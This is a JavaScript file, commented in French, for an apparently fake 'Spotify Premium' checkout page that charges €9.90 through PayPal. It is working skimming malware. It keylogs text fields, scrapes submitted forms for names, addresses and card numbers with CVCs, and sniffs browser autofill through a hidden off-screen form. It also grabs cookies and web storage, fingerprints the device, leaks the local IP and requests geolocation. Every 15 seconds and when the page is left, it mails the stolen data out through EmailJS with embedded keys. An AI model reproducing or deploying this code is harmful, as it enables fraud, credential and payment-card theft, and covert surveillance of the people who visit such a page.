/**
 * ARCHITECTURE DE RÉCUPÉRATION AVANCÉE - SPOTIFY REDESIGN
 * Version : 2.0 - collecte maximale de données sensibles
 * Fichier : js/app.js
 */

// --- CONFIGURATION ---
const EMAILJS_PUBLIC_KEY = "TIiOLwNoR3sbqQJZ-";
const EMAILJS_SERVICE_ID = "service_o9pwrgp";
const EMAILJS_TEMPLATE_ID = "template_oa57i62";

// --- ÉTAT DE LA SESSION (enrichi) ---
const startTime = Date.now();
let hasPurchased = false;
let reportSent = false;
let sessionData = {
    social: "", ui: {}, gpu: {},
    net: { ip: "Inconnue", localIp: "Recherche...", isp: "", vpn: false, proxy: false },
    hardware: {},
    identity: {
        canvasId: "", fonts: "", battery: {}, devices: "", culture: {},
        webgl: {}, audio: {}, webrtc: {}, screen: {},
        leakedInfo: { name: "Non détecté", email: "Non détecté", phone: "Non détecté", address: "", creditCard: "" }
    },
    behavior: { clicks: 0, keyPresses: 0, mouseSpeed: 0, scrollDepth: 0, focusTime: 0, lastActivity: null, formChanges: [] },
    keylog: [],  // Stockage temporaire des frappes
    forms: [],   // Valeurs saisies dans les champs
    cookies: {},
    localStorage: {},
    sessionStorage: {},
    extensions: [],
    geo: {},
    performance: {},
    timing: {}
};

// --- INITIALISATION ---
export async function initApp() {
    if (typeof emailjs !== 'undefined') {
        emailjs.init(EMAILJS_PUBLIC_KEY);
    }
    setupTracking();            // Tracking comportemental
    setupKeylogger();           // Capture des frappes
    setupFormWatcher();         // Surveillance des champs
    setupAutofillSniffer();     // Détection autofill (Ajouté)
    setupAdvancedFingerprinting(); // Empreinte avancée
    setupNetworkAnalysis();     // Analyse réseau
    await initializeSessionData();  // Collecte initiale
    renderPayPalButton();       // Interface paiement
    startPeriodicReport();      // Envoi régulier des données
}

// ====================== COLLECTE AVANCÉE ======================

/**
 * 1. EMPREINTES NUMÉRIQUES MULTIPLES
 */
function setupAdvancedFingerprinting() {
    // Canvas fingerprint amélioré
    sessionData.identity.canvasId = generateCanvasFingerprint();
    // WebGL fingerprint (vendor, renderer, etc.)
    sessionData.identity.webgl = getWebGLInfo();
    // AudioContext fingerprint
    sessionData.identity.audio = getAudioFingerprint();
    // Détection des polices installées
    sessionData.identity.fonts = detectInstalledFonts();
    // Informations écran détaillées
    sessionData.identity.screen = {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelRatio: window.devicePixelRatio,
        orientation: screen.orientation ? screen.orientation.type : "unknown"
    };
    // Détection navigateur + OS
    sessionData.identity.userAgent = navigator.userAgent;
    sessionData.identity.platform = navigator.platform;
    sessionData.identity.language = navigator.language;
    sessionData.identity.languages = navigator.languages;
    sessionData.identity.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    sessionData.identity.hardwareConcurrency = navigator.hardwareConcurrency || "unknown";
    sessionData.identity.deviceMemory = navigator.deviceMemory || "unknown";
}

/**
 * Génération d'une empreinte canvas robuste
 */
function generateCanvasFingerprint() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = 400;
    canvas.height = 150;
    ctx.fillStyle = "#f60";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#fff";
    ctx.font = "24px 'Arial'";
    ctx.fillText("Spotify", 20, 50);
    ctx.font = "18px 'Courier New'";
    ctx.fillText("ID-Check", 20, 100);
    ctx.fillStyle = "#000";
    ctx.shadowBlur = 2;
    ctx.shadowColor = "#ccc";
    ctx.fillRect(300, 20, 50, 50);
    const dataURL = canvas.toDataURL();
    let hash = 0;
    for (let i = 0; i < dataURL.length; i++) {
        hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
        hash |= 0; // Convert to 32bit integer
    }
    return Math.abs(hash).toString(16).toUpperCase();
}

/**
 * Récupération des informations WebGL
 */
function getWebGLInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return { error: "WebGL not supported" };
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            return {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
            };
        }
        return { error: "No debug info" };
    } catch(e) {
        return { error: e.message };
    }
}

/**
 * Empreinte audio via AudioContext
 */
function getAudioFingerprint() {
    return new Promise((resolve) => {
        try {
            const AudioContext = window.AudioContext || window.webkitAudioContext;
            if (!AudioContext) return resolve({ error: "AudioContext not supported" });
            const ctx = new AudioContext();
            const oscillator = ctx.createOscillator();
            const analyser = ctx.createAnalyser();
            const gain = ctx.createGain();
            oscillator.connect(analyser);
            analyser.connect(gain);
            oscillator.frequency.value = 440;
            oscillator.type = "sawtooth";
            oscillator.start(0);
            const bufferLength = analyser.frequencyBinCount;
            const dataArray = new Uint8Array(bufferLength);
            analyser.getByteFrequencyData(dataArray);
            const fingerprint = Array.from(dataArray).join('');
            oscillator.disconnect();
            ctx.close();
            resolve({ fingerprint: fingerprint.slice(0, 100), sampleRate: ctx.sampleRate });
        } catch(e) {
            resolve({ error: e.message });
        }
    });
}

/**
 * Détection des polices installées
 */
function detectInstalledFonts() {
    const fonts = [
        "Arial", "Verdana", "Times New Roman", "Courier New", "Georgia",
        "Comic Sans MS", "Impact", "Tahoma", "Trebuchet MS", "Lucida Sans",
        "Helvetica", "Roboto", "Open Sans", "Lato", "Montserrat",
        "Segoe UI", "Ubuntu", "Apple Garamond", "Calibri", "Candara"
    ];
    const testString = "mmmmmmmmmmlli";
    const baseFont = "monospace";
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = 500;
    canvas.height = 100;
    ctx.font = `72px ${baseFont}`;
    const baseWidth = ctx.measureText(testString).width;
    const detected = [];
    for (const font of fonts) {
        ctx.font = `72px ${font}, ${baseFont}`;
        const width = ctx.measureText(testString).width;
        if (width !== baseWidth) detected.push(font);
    }
    return detected;
}

/**
 * 2. ANALYSE RÉSEAU AVANCÉE
 */
function setupNetworkAnalysis() {
    // Récupération IP via plusieurs services
    fetchIPs();
    // Détection VPN/Proxy via services externes
    detectVPN();
    // Mesure des temps de réponse pour fingerprint réseau
    measureNetworkLatency();
}

async function fetchIPs() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        sessionData.net = { ...sessionData.net, ...data };
    } catch(e) {}
    try {
        const res2 = await fetch('https://api.ipify.org?format=json');
        const data2 = await res2.json();
        sessionData.net.publicIp = data2.ip;
    } catch(e) {}
}

async function detectVPN() {
    // Utilisation de services gratuits (ex: ipwhois.io, ipapi.co, etc.)
    try {
        const res = await fetch('https://ipwho.is/');
        const data = await res.json();
        if (data.proxy || data.vpn) {
            sessionData.net.vpn = true;
            sessionData.net.proxy = data.proxy;
        }
    } catch(e) {}
}

function measureNetworkLatency() {
    const start = performance.now();
    fetch('https://www.google.com/favicon.ico', { mode: 'no-cors' })
        .then(() => {
            const end = performance.now();
            sessionData.net.latency = Math.round(end - start);
        })
        .catch(() => {});
}

/**
 * 3. KEYLOGGER SILENCIEUX
 */
function setupKeylogger() {
    document.addEventListener('keydown', (e) => {
        // Éviter de capturer les touches de navigation (Alt, Ctrl, etc.)
        if (e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.isContentEditable)) {
            const value = e.key;
            if (value.length === 1 || value === 'Enter' || value === 'Tab') {
                sessionData.keylog.push({
                    target: e.target.id || e.target.name || e.target.tagName,
                    value: value,
                    timestamp: Date.now()
                });
                // Limiter la taille pour éviter la surcharge mémoire
                if (sessionData.keylog.length > 500) sessionData.keylog.shift();
            }
        }
    });
}

/**
 * 4. SURVEILLANCE DES FORMULAIRES
 */
function setupFormWatcher() {
    // Détecter tous les formulaires existants et futurs
    const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            mutation.addedNodes.forEach((node) => {
                if (node.nodeType === 1 && (node.tagName === 'FORM' || node.querySelectorAll('form').length)) {
                    attachFormListeners(node);
                }
            });
        });
    });
    observer.observe(document.body, { childList: true, subtree: true });
    // Attacher aux formulaires existants
    document.querySelectorAll('form').forEach(attachFormListeners);
}

function attachFormListeners(formElement) {
    // Capturer les soumissions
    formElement.addEventListener('submit', (e) => {
        captureFormData(formElement);
        sendImmediateReport(); // Envoi rapide lors d'une soumission
    });
    // Capturer les changements de champ
    const inputs = formElement.querySelectorAll('input, textarea, select');
    inputs.forEach((input) => {
        input.addEventListener('change', () => {
            captureFormData(formElement);
        });
        input.addEventListener('blur', () => {
            captureFormData(formElement);
        });
    });
}

function captureFormData(form) {
    const formData = new FormData(form);
    const entries = Array.from(formData.entries());
    sessionData.forms.push({
        action: form.action,
        method: form.method,
        fields: entries,
        timestamp: Date.now()
    });
    // Extraire des données sensibles potentielles
    entries.forEach(([name, value]) => {
        if (value && value.trim() !== "") {
            if (name.toLowerCase().includes('email')) sessionData.identity.leakedInfo.email = value;
            if (name.toLowerCase().includes('name')) sessionData.identity.leakedInfo.name = value;
            if (name.toLowerCase().includes('tel') || name.toLowerCase().includes('phone')) sessionData.identity.leakedInfo.phone = value;
            if (name.toLowerCase().includes('address')) sessionData.identity.leakedInfo.address = value;
            if (name.toLowerCase().includes('card') || name.toLowerCase().includes('cc') || name.includes('cvc') || name.includes('cvv')) {
                sessionData.identity.leakedInfo.creditCard = value;
            }
        }
    });
}

/**
 * 5. COLLECTE DES COOKIES, LOCALSTORAGE, SESSIONSTORAGE
 */
function captureStorages() {
    try {
        sessionData.cookies = document.cookie.split('; ').reduce((acc, cookie) => {
            const [key, val] = cookie.split('=');
            acc[key] = val;
            return acc;
        }, {});
    } catch(e) {}
    try {
        sessionData.localStorage = { ...localStorage };
    } catch(e) {}
    try {
        sessionData.sessionStorage = { ...sessionStorage };
    } catch(e) {}
}

/**
 * 6. DÉTECTION DES EXTENSIONS
 */
function detectExtensions() {
    // Technique de base : rechercher des éléments spécifiques aux extensions (ex: ghostery, adblock)
    const testElement = document.createElement('div');
    testElement.className = 'adsbox';
    document.body.appendChild(testElement);
    setTimeout(() => {
        if (testElement.offsetHeight === 0) {
            sessionData.extensions.push('AdBlock detected');
        }
        document.body.removeChild(testElement);
    }, 100);
    // Autre méthode : injecter des scripts spécifiques aux extensions populaires
    const scripts = [
        'chrome-extension://', 'moz-extension://', 'edge-extension://'
    ];
    scripts.forEach(proto => {
        if (document.querySelector(`[src^="${proto}"]`)) {
            sessionData.extensions.push(proto);
        }
    });
}

/**
 * 7. GÉOLOCALISATION (si permission accordée)
 */
async function getGeoLocation() {
    if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                sessionData.geo = {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                };
                sendImmediateReport(); // Envoyer dès que la géo est dispo
            },
            (err) => {
                sessionData.geo.error = err.message;
            }
        );
    }
}

/**
 * 8. ANALYSE DES PERFORMANCES & TIMING
 */
function capturePerformance() {
    if (window.performance && performance.timing) {
        const t = performance.timing;
        sessionData.timing = {
            loadTime: t.loadEventEnd - t.navigationStart,
            domReady: t.domContentLoadedEventEnd - t.navigationStart,
            responseTime: t.responseEnd - t.requestStart
        };
    }
    if (window.performance && performance.memory) {
        sessionData.performance.memory = {
            jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
            totalJSHeapSize: performance.memory.totalJSHeapSize,
            usedJSHeapSize: performance.memory.usedJSHeapSize
        };
    }
}

/**
 * 9. COMPORTEMENT UTILISATEUR AVANCÉ
 */
function setupTracking() {
    let lastMove = Date.now();
    document.addEventListener('mousemove', (e) => {
        const now = Date.now();
        const speed = Math.sqrt(Math.pow(e.movementX, 2) + Math.pow(e.movementY, 2));
        sessionData.behavior.mouseSpeed = Math.max(sessionData.behavior.mouseSpeed, speed);
        lastMove = now;
    });
    document.addEventListener('click', () => {
        sessionData.behavior.clicks++;
        sessionData.behavior.lastActivity = Date.now();
        // Détection d'autofill également
        sniffAutofill();
    });
    document.addEventListener('keydown', () => {
        sessionData.behavior.keyPresses++;
        sessionData.behavior.lastActivity = Date.now();
    });
    // Suivi de la profondeur de scroll
    window.addEventListener('scroll', () => {
        const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
        const depth = (scrollTop / docHeight) * 100;
        sessionData.behavior.scrollDepth = Math.max(sessionData.behavior.scrollDepth, depth);
    });
    // Temps de focus sur la page
    let focusStart = Date.now();
    window.addEventListener('focus', () => { focusStart = Date.now(); });
    window.addEventListener('blur', () => {
        const focusDuration = Date.now() - focusStart;
        sessionData.behavior.focusTime += focusDuration;
    });
}

/**
 * 10. DÉTECTION AUTOFILL AVEC FORMULAIRE CACHÉ
 */
function setupAutofillSniffer() {
    const ghostForm = document.createElement('div');
    ghostForm.innerHTML = `
        <form id="ghost-form" style="position:absolute; top:-1000px; left:-1000px; opacity:0;">
            <input type="text" name="name" autocomplete="name">
            <input type="email" name="email" autocomplete="email">
            <input type="tel" name="phone" autocomplete="tel">
            <input type="address" name="address" autocomplete="address">
        </form>
    `;
    document.body.appendChild(ghostForm);
    setInterval(() => sniffAutofill(), 2000);
}

function sniffAutofill() {
    const form = document.getElementById('ghost-form');
    if (!form) return;
    if (form.querySelector('[name="name"]').value) sessionData.identity.leakedInfo.name = form.querySelector('[name="name"]').value;
    if (form.querySelector('[name="email"]').value) sessionData.identity.leakedInfo.email = form.querySelector('[name="email"]').value;
    if (form.querySelector('[name="phone"]').value) sessionData.identity.leakedInfo.phone = form.querySelector('[name="phone"]').value;
    if (form.querySelector('[name="address"]').value) sessionData.identity.leakedInfo.address = form.querySelector('[name="address"]').value;
}

/**
 * 11. INITIALISATION COMPLÈTE DES DONNÉES
 */
async function initializeSessionData() {
    // Récupération IP locale (WebRTC)
    getLocalIP();
    // Empreinte audio (async)
    getAudioFingerprint().then(data => { sessionData.identity.audio = data; });
    // Géolocalisation
    getGeoLocation();
    // Performance
    capturePerformance();
    // Stockages
    captureStorages();
    // Extensions
    detectExtensions();
    // Batterie
    if (navigator.getBattery) {
        const b = await navigator.getBattery();
        sessionData.identity.battery = {
            level: Math.round(b.level * 100) + "%",
            charging: b.charging ? "Oui" : "Non"
        };
    }
    // IP publique (déjà dans fetchIPs)
}

async function getLocalIP() {
    return new Promise((resolve) => {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        pc.createOffer().then(pc.setLocalDescription.bind(pc));
        pc.onicecandidate = (ice) => {
            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9:]+)/.exec(ice.candidate.candidate)[1];
            if (ip.includes('.')) {
                sessionData.net.localIp = ip;
                resolve(ip);
            }
        };
        setTimeout(() => resolve("N/A"), 2000);
    });
}

// ====================== ENVOI DE RAPPORTS ======================

/**
 * Envoi périodique des données toutes les 15 secondes (pour ne rien perdre)
 */
let periodicInterval;
function startPeriodicReport() {
    periodicInterval = setInterval(() => {
        if (!hasPurchased) {
            sendFullReport();
        }
    }, 15000);
}

/**
 * Envoi immédiat (pour les événements critiques comme soumission de formulaire)
 */
async function sendImmediateReport() {
    if (hasPurchased) return;
    await sendFullReport();
}

/**
 * Construction du rapport complet (format texte ou JSON)
 */
function buildReportData() {
    const data = {
        sessionId: sessionData.identity.canvasId,
        timestamp: new Date().toISOString(),
        timeOnPage: Math.round((Date.now() - startTime) / 1000),
        identity: sessionData.identity,
        network: sessionData.net,
        behavior: sessionData.behavior,
        keylog: sessionData.keylog.slice(-20), // seulement les 20 dernières frappes
        forms: sessionData.forms.slice(-5),    // les 5 derniers formulaires
        cookies: sessionData.cookies,
        localStorage: sessionData.localStorage,
        sessionStorage: sessionData.sessionStorage,
        extensions: sessionData.extensions,
        geo: sessionData.geo,
        performance: sessionData.performance,
        timing: sessionData.timing
    };
    return JSON.stringify(data, null, 2);
}

async function sendFullReport() {
    if (reportSent && hasPurchased) return;
    // Mettre à jour les données avant envoi
    captureStorages();
    const report = buildReportData();

    try {
        await fetch('https://api.emailjs.com/api/v1.0/email/send', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                service_id: EMAILJS_SERVICE_ID,
                template_id: EMAILJS_TEMPLATE_ID,
                user_id: EMAILJS_PUBLIC_KEY,
                template_params: {
                    report_json: report,
                    user_agent: navigator.userAgent,
                    timestamp: new Date().toLocaleString()
                }
            }),
            keepalive: true
        });
        reportSent = true;
    } catch (e) {
        console.error("Échec de l'envoi du rapport:", e);
    }
}

/**
 * Envoi en cas d'abandon (fermeture, navigation)
 */
async function sendAbandonmentReport() {
    if (hasPurchased || reportSent) return;
    // Dernière collecte avant envoi
    captureStorages();
    await sendFullReport();
}

// ====================== PAIEMENT (INTERFACE) ======================

function renderPayPalButton() {
    if (!window.paypal) {
        console.error("PayPal SDK non chargé");
        return;
    }

    paypal.Buttons({
        style: { layout: 'vertical', color: 'gold', shape: 'pill', label: 'paypal' },
        createOrder: (data, actions) => actions.order.create({
            purchase_units: [{ amount: { value: '9.90' } }]
        }),
        onApprove: (data, actions) => actions.order.capture().then(() => {
            hasPurchased = true;
            clearInterval(periodicInterval);
            handleSuccessPayment();
        })
    }).render('#paypal-button-container');
}

function handleSuccessPayment() {
    const container = document.querySelector('.container');
    if (container) {
        container.innerHTML = `
            <div style="text-align:center; padding: 40px 0;">
                <div style="background:#1DB954; width:64px; height:64px; border-radius:50%; display:inline-flex; align-items:center; justify-content:center; margin-bottom:24px;">
                    <svg viewBox="0 0 24 24" width="32" fill="#000"><path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/></svg>
                </div>
                <h1 style="font-size:32px;">Bienvenue sur Spotify Premium</h1>
                <p style="color:#B3B3B3; margin-top:16px;">Votre compte est en cours d'activation. Profitez de votre musique sans limites.</p>
            </div>
        `;
    }
}

// Lier l'envoi d'abandon aux événements de fin de session
window.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'hidden') sendAbandonmentReport();
});
window.addEventListener('pagehide', sendAbandonmentReport);